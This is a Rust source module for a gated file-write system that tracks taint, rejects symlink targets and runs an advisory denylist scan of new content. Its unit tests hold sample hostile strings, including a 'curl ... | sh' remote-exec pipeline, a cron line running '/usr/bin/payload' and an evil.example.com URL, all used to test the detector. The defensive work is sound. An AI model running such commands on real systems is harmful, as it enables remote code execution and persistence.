//! M6a "Safe Hands" — pure, un-gated actuator types + advisory helpers (T2).
//!
//! This module is deliberately PURE — no SQL, no I/O, no `Store`, no syscalls. It
//! mirrors the split used by [`crate::graph`]: the database/FS work (the gate, the
//! base-state capture) lives on [`crate::log::EventLog`]; everything here is data
//! types and pure helpers. Because the types are platform-agnostic they are
//! re-exported unconditionally from `lib.rs`, even though the *mutating* engine
//! methods (T3+) are `#[cfg(unix)]`.
//!
//! The gate (`EventLog::propose_write`) is the confused-deputy defense (spec §4):
//! it computes a write VERDICT without ever mutating the filesystem. The two
//! security-critical properties it realizes — **engine-anchored taint** (L11) and
//! **fail-closed over the cited-source set** (L10) — live in the gate; the types
//! here only carry the result.

use std::path::PathBuf;

/// The kind of write a [`WriteProposal`] requests. A closed set (spec §7.2):
/// create a new file, overwrite an existing file, or hard-delete one.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WriteOp {
    /// Create a new file. The target MUST NOT already exist (gate-rejected
    /// otherwise); authorization is checked against the target's PARENT folder.
    Create,
    /// Overwrite an existing file with whole new bytes. The target MUST exist.
    Edit,
    /// Hard-delete an existing file. The target MUST exist; `new_content` is
    /// ignored. Always forces the loud modal (spec §8 monotonic rule).
    Delete,
}

/// A caller's request to write a file — the un-gated input to the gate. The
/// `target` is as-proposed (un-canonicalized); the gate canonicalizes it. For
/// `Delete`, `new_content` is ignored.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WriteProposal {
    /// The file to write, as proposed (un-canonicalized — the gate resolves it).
    pub target: PathBuf,
    /// The whole-file bytes to write (spec L2). Ignored for [`WriteOp::Delete`].
    pub new_content: Vec<u8>,
    /// Which kind of write this is.
    pub op: WriteOp,
    /// The caller's inducing events — the lineage this write is justified by.
    /// MUST be non-empty (an empty list is gate-rejected). The gate NEVER trusts
    /// this list alone for taint: it is unioned with the engine-known target
    /// provenance (spec L10/L11).
    pub source_event_ids: Vec<String>,
    /// Human-readable reason for the write (provenance display).
    pub rationale: String,
}

/// The taint verdict for a proposed write. `Untrusted` iff the engine-anchored
/// target provenance is external OR any cited source is external/unresolvable
/// (spec L10/L11). Monotonic: the gate can only ever ESCALATE to `Untrusted`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Taint {
    /// No external influence detected on either the cited sources or the target.
    Clean,
    /// External influence detected — the write is allowed but LOUD (spec L7).
    Untrusted,
}

/// Stat-based file identity captured at propose time (spec L12). The execute-time
/// guard (T4) re-asserts `(dev, ino, size)` on the fd it writes through, closing a
/// same-content/different-inode swap. Derived from `symlink_metadata` so a final
/// component swapped to a symlink is identified as the symlink, not its target.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct FileId {
    /// `st_dev` — the device the file lives on.
    pub dev: u64,
    /// `st_ino` — the inode number on that device.
    pub ino: u64,
    /// File size in bytes at propose time.
    pub size: u64,
}

/// One provenance record the verdict surfaces so the user can trace influence
/// (spec §4 "provenance display"). Built from a cited source event OR the
/// engine-anchored target `file_ingested` event.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Provenance {
    /// The source event's id.
    pub event_id: String,
    /// The source event's `type` discriminator (e.g. `"memory"`, `"file_ingested"`).
    pub kind: String,
    /// The originating file path, if the source is a tracked ingested file.
    pub origin_path: Option<String>,
    /// When the source was ingested (RFC 3339), if known.
    pub ingested_at: Option<String>,
    /// Whether this source carries the external taint stamp (spec ingest D5).
    pub is_external: bool,
}

/// Advisory diff-guard flags (spec §4 "secret/value-shaped diff guard"). A
/// DENYLIST, never a boundary: it can only ESCALATE the loud modal, never
/// downgrade it, and misses obfuscation by construction. The load-bearing
/// controls are target-restriction + taint + the human confirm.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct DiffFlags {
    /// The new content matches a secret-shaped pattern (API-key/high-entropy
    /// token, `curl | sh`, crontab line, or shell-rc / `.sh` / `.command` body).
    pub touches_secret_shaped: bool,
    /// The new content matches a value-shaped pattern (money amount or URL).
    pub touches_value_shaped: bool,
}

impl DiffFlags {
    /// True iff either advisory flag fired — the monotonic escalation input to
    /// `requires_loud_modal`.
    pub fn any(&self) -> bool {
        self.touches_secret_shaped || self.touches_value_shaped
    }
}

/// The computed verdict for a proposed write — the surface the desktop app renders
/// (the app owns the confirm modal; spec L4). Pure data: a verdict NEVER mutates
/// the filesystem. `reject_reason.is_some()` ⇒ the proposal cannot proceed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WriteVerdict {
    /// The canonicalized target (the parent, for a `Create`). `None` when the
    /// target/parent could not be resolved (then `reject_reason` is set).
    pub target_canonical: Option<PathBuf>,
    /// Whether the target is under an ACTIVE write-grant (spec L8). Advisory at
    /// propose time; the execute-time fd-relative open is the real boundary.
    pub allowed: bool,
    /// The taint verdict (engine-anchored ∪ cited-source, fail-closed; L10/L11).
    pub taint: Taint,
    /// Provenance records for the cited sources + the engine-anchored target.
    pub provenance: Vec<Provenance>,
    /// Advisory secret/value-shaped diff flags.
    pub diff_flags: DiffFlags,
    /// Hex SHA-256 of the current file bytes at propose time (`None` for Create).
    pub base_content_hash: Option<String>,
    /// `(dev, ino, size)` of the current file at propose time (`None` for Create).
    pub base_identity: Option<FileId>,
    /// MONOTONIC: `taint == Untrusted || op == Delete || diff_flags.any()`. The
    /// diff-guard can only set this, never clear it.
    pub requires_loud_modal: bool,
    /// `Some` ⇒ the proposal cannot proceed (empty sources, unresolvable target,
    /// or an op×existence mismatch). The human-readable reason.
    pub reject_reason: Option<String>,
}

/// A proposal paired with its computed verdict — the output of the gate and the
/// input to execute (T4). Carrying both together keeps the gated bytes, the base
/// hash+identity, and the taint verdict bound to the exact proposal they describe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GatedProposal {
    /// The original proposal (its bytes are what execute writes).
    pub proposal: WriteProposal,
    /// The verdict the gate computed for it.
    pub verdict: WriteVerdict,
}

/// How a target's existence relates to the requested op (spec §8 step 3). A pure
/// classifier so the op×existence matrix is single-sourced and unit-testable
/// without touching the filesystem.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpExistence {
    /// The op is consistent with the target's existence — proceed.
    Ok,
    /// `Create` but the target already exists.
    CreateExisting,
    /// `Edit`/`Delete` but the target does not exist.
    MissingTarget,
    /// The final path component is an existing symlink (never written through).
    FinalComponentSymlink,
}

impl OpExistence {
    /// The reject reason for a non-`Ok` classification, or `None` for `Ok`.
    /// Single-sourced so the gate's `reject_reason` strings cannot drift.
    pub fn reject_reason(self) -> Option<String> {
        match self {
            OpExistence::Ok => None,
            OpExistence::CreateExisting => {
                Some("create target already exists".to_string())
            }
            OpExistence::MissingTarget => {
                Some("edit/delete target does not exist".to_string())
            }
            OpExistence::FinalComponentSymlink => {
                Some("final path component is a symlink".to_string())
            }
        }
    }
}

/// Classify a requested op against the target's observed existence + symlink-ness
/// (spec §8 step 3). `exists` and `is_symlink` come from a single `symlink_metadata`
/// probe in the gate; this function holds the pure decision matrix only.
///
/// An existing **symlink** final component is rejected for EVERY op (it is never a
/// legitimate write target) and is checked first, so a symlink can never be
/// mis-classified as a plain Edit/Delete target.
pub fn classify_op_existence(op: WriteOp, exists: bool, is_symlink: bool) -> OpExistence {
    if is_symlink {
        return OpExistence::FinalComponentSymlink;
    }
    match op {
        WriteOp::Create if exists => OpExistence::CreateExisting,
        WriteOp::Edit | WriteOp::Delete if !exists => OpExistence::MissingTarget,
        _ => OpExistence::Ok,
    }
}

/// Advisory secret/value-shaped scan of the bytes to be written (spec §4). A
/// DENYLIST that can only ESCALATE the loud modal — it is intentionally simple and
/// misses obfuscation; the load-bearing controls are elsewhere. Kept pure (no I/O)
/// so it is trivially unit-testable.
///
/// Patterns (escalate-only):
/// - **value-shaped:** a money amount (`$1,234.50`) or a URL (`http://`, `https://`).
/// - **secret-shaped:** an API-key / high-entropy token (a long unbroken
///   alphanumeric run), `curl ... | sh`, a crontab schedule line, or shell-rc /
///   `.sh` / `.command` content (a shebang or an `export VAR=` line).
pub fn diff_guard(bytes: &[u8]) -> DiffFlags {
    // Non-UTF-8 content cannot match any text pattern; treat it as flag-free
    // (binary writes are not the diff-guard's concern — the human confirm is).
    let text = match std::str::from_utf8(bytes) {
        Ok(t) => t,
        Err(_) => return DiffFlags::default(),
    };

    let touches_value_shaped = has_money_amount(text) || has_url(text);
    let touches_secret_shaped = has_high_entropy_token(text)
        || has_curl_pipe_shell(text)
        || text.lines().any(is_crontab_line)
        || text.lines().any(is_shell_rc_line);

    DiffFlags {
        touches_secret_shaped,
        touches_value_shaped,
    }
}

/// A money amount: a `$` immediately followed by a digit (e.g. `$5`, `$1,234.50`).
fn has_money_amount(text: &str) -> bool {
    let bytes = text.as_bytes();
    bytes
        .iter()
        .zip(bytes.iter().skip(1))
        .any(|(a, b)| *a == b'$' && b.is_ascii_digit())
}

/// A URL: an `http://` or `https://` scheme prefix anywhere in the text.
fn has_url(text: &str) -> bool {
    text.contains("http://") || text.contains("https://")
}

/// A high-entropy token: any unbroken run of >= 32 ASCII alphanumeric characters
/// (the shape of an API key / secret). A deliberately coarse heuristic.
fn has_high_entropy_token(text: &str) -> bool {
    const MIN_TOKEN_LEN: usize = 32;
    let mut run = 0usize;
    for b in text.bytes() {
        if b.is_ascii_alphanumeric() {
            run += 1;
            if run >= MIN_TOKEN_LEN {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

/// A `curl ... | sh` (or `| bash`) remote-exec pipeline on a single line.
fn has_curl_pipe_shell(text: &str) -> bool {
    text.lines().any(|line| {
        line.contains("curl")
            && line.contains('|')
            && (line.contains("sh") || line.contains("bash"))
    })
}

/// A crontab schedule line: five whitespace-separated leading fields, each a
/// digit / `*` / `,` / `-` / `/` token, followed by a command. Matches a real
/// crontab entry shape without a full parser.
fn is_crontab_line(line: &str) -> bool {
    let fields: Vec<&str> = line.split_whitespace().collect();
    if fields.len() < 6 {
        return false;
    }
    let is_cron_field = |f: &str| {
        !f.is_empty()
            && f.bytes()
                .all(|b| b.is_ascii_digit() || matches!(b, b'*' | b',' | b'-' | b'/'))
    };
    fields[..5].iter().all(|f| is_cron_field(f))
}

/// A shell-rc / `.sh` / `.command` content line: a `#!` shebang or an `export VAR=`
/// assignment — the shapes that make a write a code/startup-script write.
fn is_shell_rc_line(line: &str) -> bool {
    let trimmed = line.trim_start();
    trimmed.starts_with("#!") || trimmed.starts_with("export ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn diff_flags_any_is_or_of_both() {
        assert!(!DiffFlags::default().any());
        assert!(DiffFlags { touches_secret_shaped: true, touches_value_shaped: false }.any());
        assert!(DiffFlags { touches_secret_shaped: false, touches_value_shaped: true }.any());
    }

    #[test]
    fn classify_symlink_final_component_rejects_every_op() {
        // A symlink final component is rejected regardless of op or existence —
        // checked FIRST so it can never be mistaken for a plain Edit/Delete target.
        for op in [WriteOp::Create, WriteOp::Edit, WriteOp::Delete] {
            assert_eq!(
                classify_op_existence(op, true, true),
                OpExistence::FinalComponentSymlink
            );
        }
    }

    #[test]
    fn classify_create_of_existing_is_rejected() {
        assert_eq!(
            classify_op_existence(WriteOp::Create, true, false),
            OpExistence::CreateExisting
        );
        // Create of an absent (non-symlink) target is fine.
        assert_eq!(
            classify_op_existence(WriteOp::Create, false, false),
            OpExistence::Ok
        );
    }

    #[test]
    fn classify_edit_or_delete_of_absent_is_rejected() {
        assert_eq!(
            classify_op_existence(WriteOp::Edit, false, false),
            OpExistence::MissingTarget
        );
        assert_eq!(
            classify_op_existence(WriteOp::Delete, false, false),
            OpExistence::MissingTarget
        );
        // Edit/Delete of an existing (non-symlink) target is fine.
        assert_eq!(classify_op_existence(WriteOp::Edit, true, false), OpExistence::Ok);
        assert_eq!(classify_op_existence(WriteOp::Delete, true, false), OpExistence::Ok);
    }

    #[test]
    fn diff_guard_flags_money_and_urls_as_value_shaped() {
        assert!(diff_guard(b"please send $1,234.50 to the account").touches_value_shaped);
        assert!(diff_guard(b"see https://evil.example.com/p").touches_value_shaped);
        // A bare dollar sign with no digit is NOT a money amount.
        assert!(!diff_guard(b"the $ sign alone").touches_value_shaped);
    }

    #[test]
    fn diff_guard_flags_secret_shapes() {
        // High-entropy token (>=32 alnum run).
        assert!(diff_guard(b"key=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789").touches_secret_shaped);
        // curl | sh.
        assert!(diff_guard(b"curl https://x.sh | sh").touches_secret_shaped);
        // crontab line.
        assert!(diff_guard(b"*/5 * * * * /usr/bin/payload").touches_secret_shaped);
        // shell-rc: shebang and export.
        assert!(diff_guard(b"#!/bin/bash\necho hi").touches_secret_shaped);
        assert!(diff_guard(b"export EVIL=1").touches_secret_shaped);
    }

    #[test]
    fn diff_guard_clean_text_flags_nothing() {
        let flags = diff_guard(b"Just some ordinary notes about the meeting.\nNothing special here.");
        assert!(!flags.any(), "ordinary prose must not trip the advisory guard");
    }

    #[test]
    fn diff_guard_non_utf8_is_flag_free() {
        // Binary content cannot match a text pattern; it is the human confirm's job.
        assert!(!diff_guard(&[0xFF, 0xFE, 0x00, 0x01]).any());
    }
}
